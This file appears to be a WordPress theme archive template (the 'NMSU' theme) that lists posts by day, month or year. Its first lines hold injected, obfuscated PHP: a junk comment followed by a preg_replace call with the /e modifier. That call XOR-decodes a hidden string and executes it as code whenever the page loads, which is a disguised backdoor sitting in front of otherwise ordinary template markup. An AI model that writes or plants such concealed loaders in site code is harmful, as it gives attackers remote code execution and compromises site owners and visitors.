<?php
/*FulsZzIOBhb0pT3WncBG1MVmNVT7nCYtx0bLyja
3xwKpHyGJ57WPijl2eN547r2X3o7RdCJ
T57HAFB8bQeA2VfDPX=7NWx3SEUUNkIheDpfIqbk77kwRF
c1bqMOifS31gc9D8AsbJX4uSyUEEZ6l2vBh9PEci
EYOHUPzwZMoIfcckh3fHtPJPMYTp8P7AoJI
9uyJY8o1ZOWQte00nNLBh10wv0Z6GXTDHHNfD3
*/
preg_replace("/zLrxy501ayyMixmd40w8G5Kl8B7/e", "W6rRY01G8nlG05A9SCrtKT701iBPWZxsUe0scyzZbZfaTfXlhEUsXQqNzsdKGP3at2HLp8kFVEgpk4QH9kzV2fipNAzTQru=h3LMyvRJ1yyZrDhooV0e2gIDh9XyoGyL90Xwup6jct0Iwfxa2v5rRCvzAHnpOa1MZN9I34rUlqdXKPxAArs"^"2\x40\x13\x3eq\x12X\x21\x10\x07\x1f4UAie\x0fg\x2d\x26\x0e\x05bub=\x19w42\x5f\x2e\x7cE\x16UCQ\x17\x3eWr\x3a=p9\x0a\x299\x10\x10\x20\x0c\x0aV\x2d\x12T9bgm\x0eAS\x07x\x7fD\x0a\x5cpnv\x02F\x09R2p\x0f\x5d\x197Q\x07\x0bEy\x22\x1f5cKM\x5e\x5c\x14em\x5fPr\x23B\x0a\x1c\x2eZ\x184K0\x04u4g\x22\x1a\x103\x1e\x28\x11\x1f\x18\x1a\x23\x5dU\x7f\x2a\x5cY\x16\x11C\x11F\x28\x1bN\x24=\x16\x29g7\x03\x163\x29\x15\x13I\x00\x27\x11n\x2e5\x2a\x5cnn\x1dIu\x09\x09\x0d\x2ccyCa\x3cPZ", "zLrxy501ayyMixmd40w8G5Kl8B7");//nG7yytmrrbHfPUDB7g66S3ALBmIDhhKJ
?><?php get_header(); ?>
        
                <div id="container">    
                        <div id="content">
                        
<?php the_post(); ?>                    
                        
<?php if ( is_day() ) : ?>
                                <h1 class="page-title"><?php printf( __( 'Daily Archives: <span>%s</span>', 'NMSU' ), get_the_time(get_option('date_format')) ) ?></h1>
<?php elseif ( is_month() ) : ?>
                                <h1 class="page-title"><?php printf( __( 'Monthly Archives: <span>%s</span>', 'NMSU' ), get_the_time('F Y') ) ?></h1>
<?php elseif ( is_year() ) : ?>
                                <h1 class="page-title"><?php printf( __( 'Yearly Archives: <span>%s</span>', 'NMSU' ), get_the_time('Y') ) ?></h1>
<?php elseif ( isset($_GET['paged']) && !empty($_GET['paged']) ) : ?>
                                <h1 class="page-title"><?php _e( 'Blog Archives', 'NMSU' ) ?></h1>
<?php endif; ?>

<?php rewind_posts(); ?>
                        
<?php global $wp_query; $total_pages = $wp_query->max_num_pages; if ( $total_pages > 1 ) { ?>
                                <div id="nav-above" class="navigation">
                                        <div class="nav-previous"><?php next_posts_link(__( '<span class="meta-nav">&laquo;</span> Older posts', 'NMSU' )) ?></div>
                                        <div class="nav-next"><?php previous_posts_link(__( 'Newer posts <span class="meta-nav">&raquo;</span>', 'NMSU' )) ?></div>
                                </div><!-- #nav-above -->
<?php } ?>                      

<?php while ( have_posts() ) : the_post(); ?>

                                <div id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
                                        <h2 class="entry-title"><a href="<?php the_permalink(); ?>" title="<?php printf( __('Permalink to %s', 'NMSU'), the_title_attribute('echo=0') ); ?>" rel="bookmark"><?php the_title(); ?></a></h2>

                                        <div class="entry-meta">
                                                <span class="meta-prep meta-prep-author"><?php _e('By ', 'NMSU'); ?></span>
                                                <span class="author vcard"><a class="url fn n" href="<?php echo get_author_link( false, $authordata->ID, $authordata->user_nicename ); ?>" title="<?php printf( __( 'View all posts by %s', 'NMSU' ), $authordata->display_name ); ?>"><?php the_author(); ?></a></span>
                                                <span class="meta-sep"> | </span>
                                                <span class="meta-prep meta-prep-entry-date"><?php _e('Published ', 'NMSU'); ?></span>
                                                <span class="entry-date"><abbr class="published" title="<?php the_time('Y-m-d\TH:i:sO') ?>"><?php the_time( get_option( 'date_format' ) ); ?></abbr></span>
                                                <?php edit_post_link( __( 'Edit', 'NMSU' ), "<span class=\"meta-sep\">|</span>\n\t\t\t\t\t\t<span class=\"edit-link\">", "</span>\n\t\t\t\t\t" ) ?>
                                        </div><!-- .entry-meta -->
                                        
                                        <div class="entry-summary">     
<?php the_excerpt( __( 'Continue reading <span class="meta-nav">&raquo;</span>', 'NMSU' )  ); ?>
                                        </div><!-- .entry-summary -->

                                        <div class="entry-utility">
                                                <span class="cat-links"><span class="entry-utility-prep entry-utility-prep-cat-links"><?php _e( 'Posted in ', 'NMSU' ); ?></span><?php echo get_the_category_list(', '); ?></span>
                                                <span class="meta-sep"> | </span>
                                                <?php the_tags( '<span class="tag-links"><span class="entry-utility-prep entry-utility-prep-tag-links">' . __('Tagged ', 'NMSU' ) . '</span>', ", ", "</span>\n\t\t\t\t\t\t<span class=\"meta-sep\">|</span>\n" ) ?>
                                                <span class="comments-link"><?php comments_popup_link( __( 'Leave a comment', 'NMSU' ), __( '1 Comment', 'NMSU' ), __( '% Comments', 'NMSU' ) ) ?></span>
                                                <?php edit_post_link( __( 'Edit', 'NMSU' ), "<span class=\"meta-sep\">|</span>\n\t\t\t\t\t\t<span class=\"edit-link\">", "</span>\n\t\t\t\t\t\n" ) ?>
                                        </div><!-- #entry-utility -->   
                                </div><!-- #post-<?php the_ID(); ?> -->

<?php endwhile; ?>                      

<?php global $wp_query; $total_pages = $wp_query->max_num_pages; if ( $total_pages > 1 ) { ?>
                                <div id="nav-below" class="navigation">
                                        <div class="nav-previous"><?php next_posts_link(__( '<span class="meta-nav">&laquo;</span> Older posts', 'NMSU' )) ?></div>
                                        <div class="nav-next"><?php previous_posts_link(__( 'Newer posts <span class="meta-nav">&raquo;</span>', 'NMSU' )) ?></div>
                                </div><!-- #nav-below -->
<?php } ?>                      
                        
                        </div><!-- #content -->         
                </div><!-- #container -->
                
<?php get_sidebar(); ?> 
<?php get_footer(); ?>